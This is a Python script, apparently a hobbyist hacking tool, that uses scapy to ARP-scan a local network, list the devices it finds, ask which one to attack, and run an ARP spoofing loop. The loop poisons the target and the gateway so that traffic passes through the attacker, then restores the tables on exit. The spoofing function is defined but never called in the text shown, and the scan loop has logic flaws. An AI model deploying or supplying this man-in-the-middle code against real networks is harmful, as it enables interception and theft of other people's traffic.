#/usr/bin/env python3

import scapy.all as scapy
import argparse
import time
import sys, subprocess, os
from multiprocessing import Process

print("Network Analysis")
print("Trying to find devices connected in your range.")

def get_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", "--target", dest="target", help="Target IP/IP Range.")
	options = parser.parse_args()
	return options

def scan(ip):
	for i in range(12):
		arp_request = scapy.ARP(pdst = ip)
		broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
		arp_request_broadcast = broadcast/arp_request
		answered_list = scapy.srp(arp_request_broadcast, timeout = 2, verbose = False)[0]
		clients_list = []
		real_list = []
	
		for element in answered_list:
			client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
			clients_list.append(client_dict)
		
		total_device_discovered = len(clients_list)
		maximum = 0
		if total_device_discovered > maximum:
			maximum = total_device_discovered
			real_list = clients_list
		
	return real_list
	
def print_result(results_list):
	print("IP\t\t\tMAC Address\n-----------------------------------------------")
	for client in results_list:
		print(client["ip"] + "\t\t" + client["mac"])
	
options = get_arguments()
scan_result = scan(options.target)
if len(scan_result) is 0:
	print("[-] No Device is Found in your network.")
	exit(0)
print_result(scan_result)

def packet_sniffer():
	print("You are close to what you want")



#NETWORK ANALYSIS BEGINS AFTER THIS

print("On which hosts do you want to perform network attacks out of the following: ")
ip_for_attack = input()


def arp_spoof():
	bin_gateway = subprocess.check_output("route -n", shell=True)
	gateway = bin_gateway.decode().split()[13]
	def get_mac(ip):
		arp_request = scapy.ARP(pdst = ip)
		broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
		arp_request_broadcast = broadcast/arp_request
		answered_list = scapy.srp(arp_request_broadcast, timeout = 2, verbose = False)[0]
	
		return answered_list[0][1].hwsrc
	
	def spoof(target_ip, spoof_ip):
		try:
			target_mac = get_mac(target_ip)
			packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
			scapy.send(packet, verbose = False)
		except IndexError:
			pass
			
	def restore(destination_ip, source_ip):
		try:
			destination_mac = get_mac(destination_ip)
			source_mac = get_mac(source_ip)
			packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
			scapy.send(packet, count = 4, verbose = False)
		except IndexError:
			pass
			
	target_ip = scan_result[int(ip_for_attack) - 1]["ip"]
	gateway_ip = gateway
	
	try:
		sent_packets_count = 0
		while True:
			spoof(target_ip, gateway_ip)
			spoof(gateway_ip, target_ip)
			sent_packets_count += 2
			print("\r[+] Packets sent: " + str(sent_packets_count), end="")
			sys.stdout.flush()
			time.sleep(1)
	except KeyboardInterrupt:
		print("\n[+] CTRL + C is pressed .... Resetting ....")
		restore(target_ip, gateway_ip)
		restore(gateway_ip, target_ip)

print("\nRun another program which is given to you in another terminal. Don't stop this program. ") 

	

